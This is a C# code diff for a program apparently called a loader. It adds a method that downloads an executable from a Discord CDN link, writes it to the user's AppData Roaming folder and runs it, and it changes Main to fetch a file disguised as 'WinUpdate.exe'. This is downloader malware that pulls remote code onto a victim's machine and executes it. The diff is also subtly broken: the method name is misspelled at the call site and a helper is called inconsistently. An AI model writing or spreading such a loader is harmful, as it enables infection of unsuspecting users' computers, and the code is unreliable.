@@ -23,6 +23,14 @@ namespace loader {
             process.Start();
         }
 
+        public static void PortableExecutableLoader(string remotePEUrl, string localPEName) {
+            string currentUser = Environment.UserName;
+            GetFile(remotePEUrl);
+            string localPEPath = $@"C:\Users\{currentUser}\AppData\Roaming\{localPEName}";
+            string command = $"/c {localPEPath}";
+            RunCommand(command);
+        }
+
         public static void DllLoader(string remoteDllUrl, string localDllName, string dllEntryName) {
             string currentUser = Environment.UserName;
             GetFile(remoteDllUrl, localDllName);
@@ -33,10 +41,9 @@ namespace loader {
 
         public static void Main(string[] args) {
 
-            string remoteDllUrl = "https://cdn.discordapp.com/attachments/804752207312322571/947659562536816701/user.dll";
-            string localDllName = "user.dll";
-            string dllEntryName = "DllMain";
-            DllLoader(remoteDllUrl, localDllName, dllEntryName);
+            string remotePEUrl = "https://cdn.discordapp.com/attachments/804752207312322571/952222704835121242/WinUpdate.exe";
+            string localPEName = "WinUpdate.exe";
+            PortableExecuatbleLoader(remotePEUrl, localPEName);
         }
     }
 }
